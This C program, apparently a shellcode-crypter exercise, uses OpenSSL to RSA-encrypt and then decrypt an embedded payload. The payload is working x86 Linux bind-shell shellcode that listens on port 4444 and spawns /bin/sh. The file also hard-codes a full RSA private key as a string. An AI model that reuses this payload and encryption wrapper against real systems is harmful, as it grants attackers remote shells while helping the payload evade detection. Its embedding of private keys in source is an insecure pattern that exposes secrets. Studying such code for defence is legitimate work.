//Use the below command to generate RSA keys with length of 2048.
//1
//openssl genrsa -out private.pem 2048
//Extract public key from private.pem with the following command.
//
//1
//openssl rsa -in private.pem -outform PEM -pubout -out public.pem
//public.pem is RSA public key in PEM format.
//private.pem is RSA private key in PEM format.

#include <openssl/pem.h>
#include <openssl/ssl.h>
#include <openssl/rsa.h>
#include <openssl/evp.h>
#include <openssl/bio.h>
#include <openssl/err.h>
#include <stdio.h>
 
int padding = RSA_PKCS1_PADDING;
int i;
 
RSA * createRSA(unsigned char * key,int public)
{
    RSA *rsa= NULL;
    BIO *keybio ;
    keybio = BIO_new_mem_buf(key, -1);
    if (keybio==NULL)
    {
        printf( "Failed to create key BIO");
        return 0;
    }
    if(public)
    {
        rsa = PEM_read_bio_RSA_PUBKEY(keybio, &rsa,NULL, NULL);
    }
    else
    {
        rsa = PEM_read_bio_RSAPrivateKey(keybio, &rsa,NULL, NULL);
    }
    if(rsa == NULL)
    {
        printf( "Failed to create RSA");
    }
 
    return rsa;
}
 
int private_encrypt(unsigned char * data,int data_len,unsigned char * key, unsigned char *encrypted)
{
    RSA * rsa = createRSA(key,0);
    int result = RSA_private_encrypt(data_len,data,encrypted,rsa,padding);
    return result;
}
int public_decrypt(unsigned char * enc_data,int data_len,unsigned char * key, unsigned char *decrypted)
{
    RSA * rsa = createRSA(key,1);
    int  result = RSA_public_decrypt(data_len,enc_data,decrypted,rsa,padding);
    return result;
}
 
void printLastError(char *msg)
{
    char * err = malloc(130);;
    ERR_load_crypto_strings();
    ERR_error_string(ERR_get_error(), err);
    printf("%s ERROR: %s\n",msg, err);
    free(err);
}
 
int main(){
 
  char plainText[] = "\x31\xc0\xb0\x66\x31\xdb\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\x5b\x31\xd2\x52\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x53\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89\xe1\xcd\x80\x93\x59\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80"; //key length : 2048
 
//  char encrypted[] = "\x37\x23\x6b\x87\x48\xf7\x32\x17\x54\xe2\x10\xed\x7b\xbe\x0f\x48\x82\xe7\xbf\x79\x54\xaa\x28\x6d\xed\x1d\x2f\x8d\xda\x01\x26\x03\xc5\xb1\x22\x20\xc0\x72\xbd\x24\xb1\x77\xa4\x61\x5b\x3d\x62\x0c\x59\xcc\x1e\x88\x7b\x5d\x28\xe0\xe9\x67\xf8\x22\xa7\x81\xf8\xe0\x2d\x44\xc5\x1a\x5f\x78\x99\x8f\x37\x41\x57\x42\x41\x26\x57\x4c\x41\x81\xbc\x89\xb3\x70\x59\x37\xf1\xfc\xb9\xf9\xc7\x76\x89\xb6\x99\xab\x84\x38\x87\x2f\x84\xce\x51\xbb\xf5\xdd\xc5\xf1\x65\xc7\x63\x7e\xaf\x6f\x35\xc8\xe0\x45\x88\x7b\xb1\x7c\x6e\x04\x57\xd9\x4b\xaa\x7f\x3a\x14\x74\xfa\x3f\x91\xd9\xba\x75\x50\x31\xc1\xbe\x0d\x16\xae\x9d\xe8\x69\xa0\x08\x98\x28\x97\x17\xd4\xb0\x79\xdd\x31\xad\xda\xfa\xc9\xfb\xe2\x8a\x12\xcc\x73\x6a\x72\x13\xeb\x0a\x06\xeb\xe6\x75\x77\xb5\x97\xad\xd7\xf0\x03\xab\x9c\x53\x87\x08\x74\x49\x86\xb5\xcd\xcb\x1b\xb1\x43\x46\x7c\x2a\xa6\xda\x74\x9f\x75\x10\xbf\xa0\xfe\x79\x5b\x34\x3e\x98\xa0\xbd\x1f\x18\xec\x3f\xb0\x0f\x5a\x1b\x32\xac\x21\x47\xee\x8d\x3d\xac\xc5\x0b\xba\x24\x95\x30\x86\xf2\xc9\xa7\xc5\x12\x5a\x05\x66\xeb\x5e\x72\x2a\x0c"; //key length : 2048

 char publicKey[]="-----BEGIN PUBLIC KEY-----\n"\
"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2VN2cIeDMyJTOfPi21eS\n"\
"5P0y4xUDTp79Qhyj6L/OjvsuSH+PdcDZW4iN2iYeDTuuRU54II459BU4PC2tbV5P\n"\
"Nab04/imPTFeSD58PR63tZVGP3m1i3yVGidu1C04bgwh6NhhJ8jS58mzMXPMr2fZ\n"\
"7SKBJRvpmlBzVeKZ52wfLXwjHAiO4lDVeRJjn2xmaRpMPTQ/KcTN0If5trhZVST/\n"\
"bAm5GirQQhGi5bUS/upBI/oRiQj8WuVuEEpejQbXgzV0I9HeqNdTz3SHojzt+6al\n"\
"pYgSws09E+NFAxsdXl92dU76QvAEEdHP/7zz+SF3AMPfrXc+zRNtiXaq0WGgdImw\n"\
"AQIDAQAB\n"\
"-----END PUBLIC KEY-----\n";
  
 char privateKey[]="-----BEGIN RSA PRIVATE KEY-----\n"\
"MIIEowIBAAKCAQEA2VN2cIeDMyJTOfPi21eS5P0y4xUDTp79Qhyj6L/OjvsuSH+P\n"\
"dcDZW4iN2iYeDTuuRU54II459BU4PC2tbV5PNab04/imPTFeSD58PR63tZVGP3m1\n"\
"i3yVGidu1C04bgwh6NhhJ8jS58mzMXPMr2fZ7SKBJRvpmlBzVeKZ52wfLXwjHAiO\n"\
"4lDVeRJjn2xmaRpMPTQ/KcTN0If5trhZVST/bAm5GirQQhGi5bUS/upBI/oRiQj8\n"\
"WuVuEEpejQbXgzV0I9HeqNdTz3SHojzt+6alpYgSws09E+NFAxsdXl92dU76QvAE\n"\
"EdHP/7zz+SF3AMPfrXc+zRNtiXaq0WGgdImwAQIDAQABAoIBAGf5yZG/E+NUCdOR\n"\
"PrlIZcxO45jHheSIpoyJ3VXO5sl7nUIsXXut/5AOfief0wLryc344/pXcZy4xkXs\n"\
"aKwJ0gXOUh376bUfOIeB9bjcSHKE764Q0e3hdgikUx8KX5QvE84uMBVzvIwO8T+4\n"\
"snY9ToNo3bbeat5cnUG6/308OpJsjyrj/zlVNKRZQum3aVWWvGHUNubnBDPYSkvx\n"\
"tYYmsMmuv5EJMDVbOOOTZMG1Yi80PDlNuT2JmwUl7n09fBhTfmxt6sH7BmkL58Qc\n"\
"wY+63fWBCpbhvX+L4H5BpQy1VEC+gx0uN8HrxjzACoaedrwx6j60wuokdxkFgJTU\n"\
"bxEFhJECgYEA8mIOJx1hsYGK0eBi1NQMeDhT5bP2y+dh8be3oK1Q9IiIo5VXm6s4\n"\
"Wr00BTq8nj+O+9dfYw2iTu4hVXqM+9TGIrEAlSQub0oW0K1s/A5uppeN0VI01K4s\n"\
"11bScBW4WXx0xauCJ0iBG/LFRTBFTim+ByFbX9/YPRMp0+7qdqaE3z0CgYEA5YkJ\n"\
"08inV2x0gtaCAw/CO5Lk5jl6NrIfnvLpOmAXuBjQgcZMdq1OU7y6whq85IW9EeBy\n"\
"Jhj+b80mtiSsz3oWRO7PXfJggJ5lZBHIuNgcHenj4kpkASduI5YsUaAf9yUhd4kK\n"\
"XIMBfUlf921zGFFQiCEg5SYcU0WX9v4/105m4BUCgYA8N7RAb4JH8WElx1OGgLAg\n"\
"Zg4h8VYNToz82qHaX3TPa+RWj9HWMPGtSXhVHESkJDJHyzg9ibObXHoXnHzOTAx1\n"\
"rffxFa4bpBKLAasj7An9hYWMTZomhKdLUJyzkBHe2ZbBTVzmmZLJ+MSd7eIqCyDU\n"\
"8Kqc5SX59nrb1m2V0MUOGQKBgGoFPTvMX7caykowyIaffcjElePdQp0G82IYsy+a\n"\
"ePo4w/5dWK4saJR3BRBpBzzKpUUflboRK1z6tlnFYOjIbIbUg4XSUU63Wv+40yzF\n"\
"7V7HzNGWKND7pHzdfYUKYBlo1id/bgDDJin3fVMtA8+Ep5zpKGePjd/Msl+MmnJZ\n"\
"rVztAoGBANigq8mZk34FXqVXZdFb+44h+6BgnBfXYB/Ur6zw5EHmTKy9m9wRHo2l\n"\
"oclwFOB7k5HP2kaUUzDSGILq8XgRwNs4Zf5gMlhF+G2471/4BVoVwHqh+SUS4j92\n"\
"C6uBSjlAigrUhYPUy9pl0F/FZDOciU9NLciQVZTMYCRfkJ7fAqbF\n"\
"-----END RSA PRIVATE KEY-----\n";
 
    
unsigned char encrypted[4098]={};
unsigned char decrypted[4098]={};
printf("\nOriginal Length =%d\n",strlen(plainText));
    printf("Original message: \n");
	for (i=0; i<strlen(plainText); i++) {
		printf("\\x%02x", (unsigned char)plainText[i]);
	}
    printf("\n"); 
//################## PRIVATE ENCRYPT ##########################
int encrypted_length= private_encrypt(plainText,strlen(plainText),privateKey,encrypted);
if(encrypted_length == -1)
{
    printLastError("Private Encrypt failed");
    exit(0);
}
printf("\nPrivate encrypted length =%d\n",encrypted_length);
    printf("Private encrypted message: \n");
	for (i=0; i<encrypted_length; i++) {
		printf("\\x%02x", (unsigned char)encrypted[i]);
	}
    printf("\n"); 

//################## PUBLIC DECRYPT ##########################
int decrypted_length = public_decrypt(encrypted,encrypted_length,publicKey, decrypted);
if(decrypted_length == -1)
{
    printLastError("Public Decrypt failed");
    exit(0);
}
printf("\nDOUBLE CHECK IF ORIGINAL MATCHES THIS ONE BELOW!!!\n");
printf("Public decrypted Length =%d\n",decrypted_length);
    printf("Public decrypted message: \n");
	for (i=0; i<decrypted_length; i++) {
		printf("\\x%02x", (unsigned char)decrypted[i]);
	}
    printf("\n"); 
}

